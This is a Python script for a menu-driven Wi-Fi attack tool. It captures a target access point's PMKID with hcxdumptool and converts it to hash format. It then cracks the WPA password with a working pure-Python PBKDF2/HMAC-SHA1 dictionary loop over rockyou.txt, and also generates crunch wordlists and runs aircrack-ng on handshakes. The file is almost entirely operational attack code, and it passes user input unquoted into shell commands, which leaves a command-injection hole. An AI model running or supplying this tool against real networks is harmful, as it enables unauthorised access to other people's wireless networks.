#!/usr/bin/env python3
import os
import time
import subprocess
import hashlib
import hmac
import sys
from subprocess import check_call
from binascii import unhexlify

# Add tqdm import for progress bar
try:
    from tqdm import tqdm
except ImportError:
    print("[!] tqdm not found. Installing...")
    os.system("pip install tqdm")
    from tqdm import tqdm

interface = None

def start():
    print("\nInstalling necessary Tools..")
    print("This may take a while, please be patient\n")
    os.system("apt-get update && apt-get install xterm aircrack-ng hcxtools hcxdumptool crunch reaver -y")
    os.system("sleep 3 && clear")

def main():
    cmd = os.system("clear")
    print("""\033[1;92m
                                            
-------------------------------------------------------------------------  
[+] Security Project: WIFI Hacking PMKID Attack
[+] Press CTRl + B to go back to main menu

(1) PMKID Attack - Step 1: Monitor & Capture PMKID
(2) PMKID Attack - Step 2: Crack PMKID Password
(3) Scan Networks
(4) Capturing Handshake(monitor mode needed)                    
(5) Crack Handshake (Handshake needed)               
(6) Create your own passwordlist

(00)Exit
----------------------------------------------------------------------- """)
    print("\n")
    number = input("[+] Enter the number : ")

    if number == "1":
        pmkid_step1_capture()
    elif number == "2":
        pmkid_step2_crack()
    elif number == "3":
        show_networks()
    elif number == "4":
        print("[!] Handshake capture not implemented yet")
        time.sleep(2)
        main()
    elif number == "5":
        print("[!] Handshake cracking not implemented yet")
        time.sleep(2)
        main()
    elif number == "6":
        create_passwordlist()
    elif number == "00":
        exit()
    else:
        print("Invalid number..")
        time.sleep(2)
        main()
    
def start_monitor_mode():
    global interface
    interface = input("\nEnter the interface (Default: wlan0): ").strip()
    if not interface:
        interface = "wlan0"
    subprocess.run("airmon-ng start " + interface, shell=True)
    subprocess.run("airmon-ng check kill", shell=True)

    print(f"\n{interface} set to monitor mode..")
    time.sleep(4)

def stop_monitor_mode():
    global interface
    if interface is None:
        print("\n[!] Monitor mode is not started yet.")
        return

    subprocess.run(["airmon-ng", "stop", interface])
    print(f"\nMonitor mode stopped on {interface}..")
    interface = None
    time.sleep(4)
    main()

def show_networks():
    global interface
    if interface is None:
        print("\n[!] Monitor mode is not started yet.")
        return
    print("\n[+] Scanning for networks... Press CTRL+C to stop.\n")
    time.sleep(2)
    os.system(f"airodump-ng {interface}")

def pmkid_step1_capture():
    """Step 1: Monitor networks and capture PMKID"""
    global interface
    if interface is None:
        print("\n[!] Your adapter must be in monitor mode first.")
        start_monitor_mode()

    print("\n" + "="*60)
    print("PMKID ATTACK - STEP 1: MONITOR & CAPTURE")
    print("="*60)

    # Scan for networks
    print("\n[+] Scanning for available networks...")
    show_networks()

    # Get target details
    bssid = input("\nEnter the BSSID of the target AP: ").strip()
    channel = input("Enter Channel of the target AP: ").strip()
    
    if not bssid or not channel:
        print("[!] BSSID and Channel are required!")
        time.sleep(2)
        pmkid_step1_capture()
        return

    # Set channel
    subprocess.run(["iwconfig", interface, "channel", channel])

    # Capture PMKID
    print(f"\n[+] Starting hcxdumptool to capture PMKID from {bssid}...")
    print("[+] Press CTRL+C to stop when PMKID is captured.")
    time.sleep(3)
    
    try:
        os.system(f"hcxdumptool -i {interface} --enable_status=1 -o pmkid.pcapng --filterlist_ap={bssid} --filtermode=2")
    except KeyboardInterrupt:
        print("\n[+] PMKID capture stopped by user.")

    pmkid_path = os.path.join(os.getcwd(), "pmkid.pcapng")
    if os.path.exists(pmkid_path):
        print(f"\n[✔] PMKID captured successfully! Saved at: {pmkid_path}")
        print("\n[+] You can now proceed to Step 2 to crack the password.")
    else:
        print("\n[✘] PMKID capture failed or file not found.")

    time.sleep(5)
    main()

def crack_pmkid(hashfile="pmkid.22000", wordlist="rockyou.txt"):
    """
    Crack a PMKID hash using pure Python with progress bar.
    Format: <AP-MAC>*<STA-MAC>*<PMKID>*<SSID>
    """
    # 1. Read & parse the hashfile
    try:
        with open(hashfile, "r", errors="ignore") as f:
            line = f.readline().strip()
    except FileNotFoundError:
        print(f"[!] Cannot open hashfile: {hashfile}")
        return None

    parts = line.split("*")
    if len(parts) < 6:
        print("[!] Unexpected pmkid.22000 format")
        return None

    pmkid_hex, ap_mac, sta_mac, ssid_hex = parts[2], parts[3], parts[4], parts[5]
    try:
        ssid = bytes.fromhex(ssid_hex).decode("utf-8", errors="ignore")
    except ValueError:
        ssid = ssid_hex  # maybe it wasn't hex

    ap_bytes   = unhexlify(ap_mac)
    sta_bytes  = unhexlify(sta_mac)
    pmkid_tgt  = unhexlify(pmkid_hex)

    # 2. Count total passwords for tqdm
    try:
        total = sum(1 for _ in open(wordlist, "r", errors="ignore"))
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {wordlist}")
        return None

    print(f"[*] SSID: {ssid}")
    print(f"[*] AP MAC: {ap_mac}, STA MAC: {sta_mac}")
    print(f"[*] Trying {total:,} passwords from {wordlist}\n")

    # 3. Iterate with tqdm progress bar
    with open(wordlist, "r", errors="ignore") as wf:
        for pwd in tqdm(wf, total=total, unit="pw"):
            pwd = pwd.strip()
            # PBKDF2-HMAC-SHA1 to derive PMK
            pmk = hashlib.pbkdf2_hmac(
                "sha1",
                pwd.encode("utf-8"),
                ssid.encode("utf-8"),
                4096,
                dklen=32
            )
            # HMAC-SHA1("PMK Name"||AP||STA)[:16]
            pmkid_calc = hmac.new(
                pmk,
                b"PMK Name" + ap_bytes + sta_bytes,
                hashlib.sha1
            ).digest()[:16]

            if pmkid_calc == pmkid_tgt:
                print(f"\n[✔] Password found: {pwd}")
                return pwd

    print("\n[✘] Password not in the wordlist.")
    return None

def pmkid_step2_crack():
    """Step 2: Convert PMKID to hash format and crack password"""
    print("\n" + "="*60)
    print("PMKID ATTACK - STEP 2: CRACK PASSWORD")
    print("="*60)

    # Check if pmkid.pcapng exists
    pmkid_path = "pmkid.pcapng"
    if not os.path.exists(pmkid_path):
        print(f"\n[!] {pmkid_path} not found in current directory.")
        print("[+] You need to run Step 1 first to capture PMKID, or")
        custom_path = input("Enter the full path to your pmkid.pcapng file: ").strip()
        if not custom_path or not os.path.exists(custom_path):
            print("[!] Invalid path or file not found!")
            time.sleep(2)
            main()
            return
        pmkid_path = custom_path

    print(f"\n[+] Using PMKID file: {pmkid_path}")

    # Convert to 22000 format
    print("[+] Converting pcapng to hash file...")
    try:
        subprocess.run(["hcxpcapngtool", "-o", "pmkid.22000", pmkid_path], check=True)
        print("[✔] Successfully converted to pmkid.22000")
    except subprocess.CalledProcessError:
        print("[✘] Failed to convert PMKID file. Make sure hcxtools is installed.")
        time.sleep(2)
        main()
        return
    except FileNotFoundError:
        print("[✘] hcxpcapngtool not found. Make sure hcxtools is installed.")
        time.sleep(2)
        main()
        return

    hashfile = "pmkid.22000"
    if not os.path.exists(hashfile):
        print("[✘] Failed to create hash file!")
        time.sleep(2)
        main()
        return

    # Choose wordlist
    print("\n[1] Use rockyou.txt (default)")
    print("[2] Use custom wordlist")
    choice = input("\n[+] Enter your choice: ").strip()

    if choice == "1":
        wordlist = "rockyou.txt"
        gz_path = "rockyou.txt.gz"
        if not os.path.exists(wordlist):
            if os.path.exists(gz_path):
                print("[+] Extracting rockyou.txt.gz ...")
                os.system(f"gzip -d {gz_path}")
            else:
                print("[!] rockyou.txt or rockyou.txt.gz not found!")
                print("[+] Please download rockyou.txt or provide a custom wordlist.")
                time.sleep(2)
                main()
                return
    elif choice == "2":
        wordlist = input("\nEnter the full path to the wordlist: ").strip()
        if not os.path.exists(wordlist):
            print("[!] Wordlist not found!")
            time.sleep(2)
            main()
            return
    else:
        print("[!] Invalid choice.")
        time.sleep(2)
        main()
        return

    # Start cracking
    print(f"\n[+] Starting PMKID cracking with {wordlist}...")
    print("[+] This may take a while depending on the wordlist size...")
    
    result = crack_pmkid(hashfile, wordlist)
    
    if result:
        print(f"\n[🎉] SUCCESS! Password cracked: {result}")
    else:
        print("\n[😞] Password not found in the wordlist.")

    time.sleep(10)
    main()

def create_passwordlist():
    print("\n[+] Size of the file and time taken to create the password list depends on your input..")
    print("\n[+] Enter the characters to be included in the password list.")
    print("[+] Example: if you only want list include numbers enter : 0123456789")
    characters = input("\n[+] Enter the characters : ").strip()
    length = input("\n[+] Enter the minimum length of the password (8/64) : ").strip()
    output = input("\n[+] Enter the minimum length of the password (8/64) : ").strip()
    print("\nCreating password list... Please wait.")
    subprocess.run(f"crunch {length} {length} {characters} -o passwordlist.txt", shell=True)
    a = os.getcwd()
    print(f"\nPassword list created at {a}\n")
    time.sleep(5)
    choice = input("\nDo you want to crack handshake using this password list? (y/n) : ")
    if choice == "y":
        handshake_path = input("\n[+] Enter the path of the handshake file: ").strip()
        print("\nTo exit Press CTRL +C")
        os.system(f"aircrack-ng {handshake_path} -w passwordlist.txt")
    time.sleep(15)
    main()

if __name__ == "__main__":
    start()
    main()
